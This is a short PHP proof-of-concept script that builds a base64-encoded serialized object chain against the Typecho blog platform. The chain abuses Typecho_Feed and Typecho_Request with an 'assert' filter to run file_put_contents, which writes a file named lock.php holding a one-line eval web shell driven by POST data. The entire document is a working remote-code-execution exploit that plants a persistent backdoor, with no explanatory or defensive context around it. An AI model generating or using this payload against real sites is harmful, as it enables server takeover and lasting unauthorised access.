<?php
/**
 * @Author: lock
 * @Date:   2017-11-10 11:20:01
 * @Last Modified by:   lock
 * @Last Modified time: 2017-11-10 11:20:29
 */
 
class Typecho_Feed{
    private $_type='ATOM 1.0';
    private $_items;
 
    public function __construct(){
        $this->_items = array(
            '0'=>array(
                'author'=> new Typecho_Request())
        );
    }
}
 
class Typecho_Request{
    private $_params = array('screenName'=>'file_put_contents("lock.php","<?php @eval($_POST[lock]);?>")');
    private $_filter = array('assert');
}
 
 
$poc = array(
'adapter'=>new Typecho_Feed(),
'prefix'=>'typecho');
 
echo base64_encode(serialize($poc));
